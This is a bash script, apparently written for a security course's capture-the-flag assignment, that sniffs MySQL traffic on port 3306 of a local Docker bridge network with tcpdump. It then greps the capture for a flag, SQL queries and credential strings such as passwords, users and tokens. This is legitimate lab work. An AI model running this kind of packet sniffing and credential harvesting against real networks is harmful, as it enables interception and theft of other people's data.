#!/bin/bash
# MITM Attack using tcpdump
# Captures MySQL traffic and extracts Flag 1

echo "=========================================="
echo "MITM Attack - MySQL Traffic Capture"
echo "=========================================="
echo ""

# Find Docker network
NETWORK_NAME="csce413_assignment2_vulnerable_network"
echo "📋 Finding Docker network..."

# Get network info
NETWORK_INFO=$(docker network inspect $NETWORK_NAME 2>/dev/null)
if [ $? -ne 0 ]; then
    echo "❌ Docker network not found: $NETWORK_NAME"
    echo "   Make sure Docker containers are running: docker compose ps"
    exit 1
fi

# Find bridge interface
echo "🔍 Finding bridge interface..."
BRIDGE_IF=$(docker network inspect $NETWORK_NAME | grep -oP '"Name": "\K[^"]+' | grep br- | head -1)

if [ -z "$BRIDGE_IF" ]; then
    # Alternative: find by checking interfaces
    BRIDGE_IF=$(ip link show 2>/dev/null | grep -oP 'br-[0-9a-f]+' | head -1)
fi

if [ -z "$BRIDGE_IF" ]; then
    echo "⚠️  Could not find bridge interface automatically"
    echo "   Available interfaces:"
    ip link show 2>/dev/null | grep -E "^[0-9]+:" | awk '{print $2}' | tr -d ':' || ifconfig | grep -E "^[a-z]" | cut -d: -f1
    echo ""
    read -p "Enter bridge interface name (e.g., br-xxxxx or docker0): " BRIDGE_IF
fi

if [ -z "$BRIDGE_IF" ]; then
    echo "❌ No interface specified. Exiting."
    exit 1
fi

echo "✅ Using interface: $BRIDGE_IF"
echo ""

# Check if interface exists
if ! ip link show "$BRIDGE_IF" &>/dev/null && ! ifconfig "$BRIDGE_IF" &>/dev/null 2>/dev/null; then
    echo "❌ Interface $BRIDGE_IF not found"
    exit 1
fi

# Output file
OUTPUT_FILE="mitm/mysql_traffic.pcap"
mkdir -p mitm

echo "📡 Starting traffic capture..."
echo "   Interface: $BRIDGE_IF"
echo "   Port: 3306 (MySQL)"
echo "   Output: $OUTPUT_FILE"
echo ""
echo "⚠️  Now generate traffic by:"
echo "   1. Open browser: http://localhost:5001"
echo "   2. Navigate through pages"
echo "   3. Refresh multiple times"
echo ""
echo "Press Ctrl+C to stop capturing..."
echo ""

# Capture traffic
sudo tcpdump -i "$BRIDGE_IF" -A -s 0 'port 3306' -w "$OUTPUT_FILE" 2>&1 | tee mitm/capture.log

echo ""
echo "✅ Capture complete!"
echo ""

# Analyze captured traffic
if [ -f "$OUTPUT_FILE" ]; then
    echo "📊 Analyzing captured traffic..."
    echo ""
    
    # Extract readable data
    echo "=== MySQL Traffic Analysis ===" > mitm/analysis.txt
    echo "" >> mitm/analysis.txt
    
    # Look for flags
    echo "Searching for flags..."
    tcpdump -r "$OUTPUT_FILE" -A 'port 3306' 2>/dev/null | grep -i "FLAG{" | head -5
    
    # Extract SQL queries
    echo ""
    echo "=== SQL Queries ===" >> mitm/analysis.txt
    tcpdump -r "$OUTPUT_FILE" -A 'port 3306' 2>/dev/null | grep -E "(SELECT|INSERT|UPDATE|DELETE|SHOW)" | head -10 >> mitm/analysis.txt
    
    # Look for credentials
    echo ""
    echo "=== Potential Credentials ===" >> mitm/analysis.txt
    tcpdump -r "$OUTPUT_FILE" -A 'port 3306' 2>/dev/null | grep -iE "(password|user|root|token)" | head -10 >> mitm/analysis.txt
    
    echo ""
    echo "📄 Full analysis saved to: mitm/analysis.txt"
    echo "📦 PCAP file: $OUTPUT_FILE"
    echo ""
    echo "To view in Wireshark:"
    echo "  wireshark $OUTPUT_FILE"
    echo ""
    echo "To view readable output:"
    echo "  tcpdump -r $OUTPUT_FILE -A 'port 3306' | less"
else
    echo "❌ No capture file created"
fi

